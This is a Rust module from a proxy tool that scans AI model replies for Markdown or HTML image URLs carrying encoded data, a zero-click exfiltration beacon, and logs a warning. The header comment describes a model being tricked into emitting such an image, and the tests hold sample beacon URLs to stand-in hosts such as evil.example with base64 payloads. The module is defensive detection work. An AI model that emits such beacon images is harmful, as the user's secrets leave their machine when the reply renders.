//! Image/link exfil warning (#15) — opt-in, WARN-ONLY response inspection.
//!
//! A known zero-click data-exfiltration pattern: a model is tricked into
//! emitting a Markdown image (or `<img>`) whose URL embeds stolen data in its
//! query string — e.g. `![](https://evil.example/p?d=<base64-secret>)`. When
//! the user's editor/chat UI renders that reply, it auto-fetches the URL and
//! the data leaves the machine. Burnwall cannot *block* this: the fetch happens
//! in the UI, not through the proxy. What it can do — uniquely, from its wire
//! vantage — is **warn**: record a `security_event` so the user learns their
//! reply carried a beacon.
//!
//! This is deliberately tight to keep false positives near zero. A plain image
//! reference (`![chart](https://example.com/chart.png)`) never fires — only an
//! image URL carrying a long, encoded, data-shaped query/path value does. The
//! response bytes are **never modified** (CLAUDE.md), and nothing is ever
//! blocked. Off by default (`security.warn_response_exfil`).

/// What tripped the warning. Holds only the destination host and the carrier
/// kind — never the exfiltrated data itself (we record metadata, not payloads).
#[derive(Debug, Clone, PartialEq)]
pub struct ExfilWarning {
    /// Destination host the beacon would fetch (e.g. `evil.example`). Empty if
    /// it could not be parsed out.
    pub host: String,
    /// `"markdown-image"` or `"html-image"`.
    pub carrier: &'static str,
}

/// Scan a model reply (raw response bytes, JSON / SSE / plain — we treat it as
/// lossy UTF-8 text) for an auto-rendering image whose URL carries embedded
/// data. Returns the first such finding, or `None`.
pub fn scan_reply(bytes: &[u8]) -> Option<ExfilWarning> {
    // Cheap pre-filter: no image markup at all → nothing to do. Covers the
    // overwhelming majority of replies for ~free.
    let text = String::from_utf8_lossy(bytes);
    if !text.contains("![") && !text.contains("<img") {
        return None;
    }
    for (url, carrier) in image_urls(&text) {
        if url_carries_data(url) {
            return Some(ExfilWarning {
                host: host_of(url).to_string(),
                carrier,
            });
        }
    }
    None
}

/// Yield `(url, carrier)` for every image reference in `text`: Markdown
/// `![alt](URL)` and HTML `<img … src="URL">` (single or double quoted).
fn image_urls(text: &str) -> Vec<(&str, &'static str)> {
    let mut out = Vec::new();

    // Markdown images: `![` … `](` URL `)`. We don't need the alt text.
    let mut i = 0;
    while let Some(rel) = text[i..].find("![") {
        let open = i + rel;
        // Find the `](` that starts the URL, then the closing `)`.
        if let Some(paren_rel) = text[open..].find("](") {
            let url_start = open + paren_rel + 2;
            if let Some(end_rel) = text[url_start..].find(')') {
                let raw = text[url_start..url_start + end_rel].trim();
                // Markdown allows `(url "title")`; keep only the URL token.
                let url = raw.split_whitespace().next().unwrap_or(raw);
                if is_http(url) {
                    out.push((url, "markdown-image"));
                }
                i = url_start + end_rel + 1;
                continue;
            }
        }
        i = open + 2;
    }

    // HTML images: `<img … src=("|')URL("|')`.
    let mut j = 0;
    while let Some(rel) = text[j..].find("<img") {
        let tag = j + rel;
        let tail = &text[tag..];
        // Bound the search to the end of this tag.
        let tag_end = tail.find('>').map(|e| tag + e).unwrap_or(text.len());
        if let Some(url) = extract_src(&text[tag..tag_end]) {
            if is_http(url) {
                out.push((url, "html-image"));
            }
        }
        j = tag_end.max(tag + 4);
    }

    out
}

/// Pull the `src` attribute value out of an `<img …>` tag slice.
fn extract_src(tag: &str) -> Option<&str> {
    let lower = tag.to_ascii_lowercase();
    let src_rel = lower.find("src")?;
    // Move past `src`, optional whitespace, and `=`.
    let after = &tag[src_rel + 3..];
    let eq = after.find('=')?;
    let val = after[eq + 1..].trim_start();
    let quote = val.chars().next()?;
    if quote == '"' || quote == '\'' {
        let rest = &val[1..];
        let end = rest.find(quote)?;
        Some(&rest[..end])
    } else {
        // Unquoted attribute: read up to whitespace or `>`.
        Some(val.split([' ', '\t', '\n', '>']).next().unwrap_or(val))
    }
}

fn is_http(url: &str) -> bool {
    url.starts_with("http://") || url.starts_with("https://")
}

/// Host portion of an http(s) URL (between `://` and the next `/`, `?`, or `#`).
fn host_of(url: &str) -> &str {
    let after = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    after
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after)
        // strip any `user@` and `:port`
        .rsplit('@')
        .next()
        .unwrap_or(after)
        .split(':')
        .next()
        .unwrap_or(after)
}

/// Does this image URL carry a long, encoded, data-shaped value in its query
/// string or path? This is the discriminator that separates a tracking/exfil
/// beacon from an ordinary image. Tight on purpose:
///
/// - a query parameter value, OR a path segment, that is ≥ 32 chars and looks
///   like encoded data (base64 / hex / percent-encoding, no spaces).
fn url_carries_data(url: &str) -> bool {
    // Everything after the host.
    let after_host = url
        .split_once("://")
        .map(|(_, r)| r)
        .unwrap_or(url)
        .split_once('/')
        .map(|(_, r)| r)
        .unwrap_or("");

    // Query parameter values.
    if let Some((_, query)) = after_host.split_once('?') {
        for pair in query.split('&') {
            let val = pair.split_once('=').map(|(_, v)| v).unwrap_or(pair);
            if looks_like_encoded_data(val) {
                return true;
            }
        }
    }

    // Path segments (before any query).
    let path = after_host.split(['?', '#']).next().unwrap_or(after_host);
    for seg in path.split('/') {
        if looks_like_encoded_data(seg) {
            return true;
        }
    }
    false
}

/// Heuristic: a token long enough and dense enough to be smuggled data, not a
/// human-meaningful slug or a short id. ≥ 32 chars, all from the
/// base64/hex/percent-encoding alphabet, and not an obvious image filename.
fn looks_like_encoded_data(s: &str) -> bool {
    if s.len() < 32 {
        return false;
    }
    // A normal image asset path ends in a known extension — not a beacon.
    let lower = s.to_ascii_lowercase();
    if lower.ends_with(".png")
        || lower.ends_with(".jpg")
        || lower.ends_with(".jpeg")
        || lower.ends_with(".gif")
        || lower.ends_with(".webp")
        || lower.ends_with(".svg")
    {
        return false;
    }
    let ok = |c: char| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '%' | '-' | '_');
    if !s.chars().all(ok) {
        return false;
    }
    // Require a minimum density of digits+upper or %-escapes so an all-lowercase
    // dashed slug (`a-very-long-but-human-readable-section-title`) doesn't fire.
    let encoded_signal = s
        .chars()
        .filter(|c| c.is_ascii_digit() || c.is_ascii_uppercase() || *c == '%' || *c == '+')
        .count();
    encoded_signal * 4 >= s.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_markdown_image_beacon_with_base64_query() {
        let reply = r#"Here is your summary.

![](https://evil.example/collect?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEVLRVk1NTU1)"#;
        let w = scan_reply(reply.as_bytes()).expect("beacon must be flagged");
        assert_eq!(w.host, "evil.example");
        assert_eq!(w.carrier, "markdown-image");
    }

    #[test]
    fn flags_html_img_beacon() {
        let reply =
            r#"<img src="https://track.example/p/ZXhmaWx0cmF0ZWQtc2VjcmV0LWRhdGEtcGF5bG9hZA==">"#;
        let w = scan_reply(reply.as_bytes()).expect("html beacon must be flagged");
        assert_eq!(w.host, "track.example");
        assert_eq!(w.carrier, "html-image");
    }

    #[test]
    fn ordinary_image_does_not_fire() {
        let reply = "![architecture diagram](https://example.com/img/architecture.png)";
        assert!(scan_reply(reply.as_bytes()).is_none());
    }

    #[test]
    fn image_with_short_query_does_not_fire() {
        // Versioned asset — short query, not data.
        let reply = "![logo](https://cdn.example.com/logo.png?v=3)";
        assert!(scan_reply(reply.as_bytes()).is_none());
    }

    #[test]
    fn human_readable_long_slug_does_not_fire() {
        let reply =
            "![](https://example.com/this-is-a-very-long-but-human-readable-image-slug-name.png)";
        assert!(scan_reply(reply.as_bytes()).is_none());
    }

    #[test]
    fn reply_with_no_images_is_free_and_clean() {
        let reply = "Just some normal prose with a link [docs](https://example.com/docs).";
        assert!(scan_reply(reply.as_bytes()).is_none());
    }

    #[test]
    fn never_echoes_the_payload_only_the_host() {
        let secret = "QUtJQUlPU0ZPRE5ON0VYQU1QTEVLRVk5OTk5OTk5OQ==";
        let reply = format!("![](https://evil.example/c?x={secret})");
        let w = scan_reply(reply.as_bytes()).unwrap();
        assert_eq!(w.host, "evil.example");
        // The finding carries no payload data.
        assert!(!format!("{w:?}").contains(secret));
    }

    #[test]
    fn host_parsing_strips_port_and_userinfo() {
        assert_eq!(
            host_of("https://user@host.example:8443/path"),
            "host.example"
        );
        assert_eq!(host_of("http://1.2.3.4/x"), "1.2.3.4");
    }
}
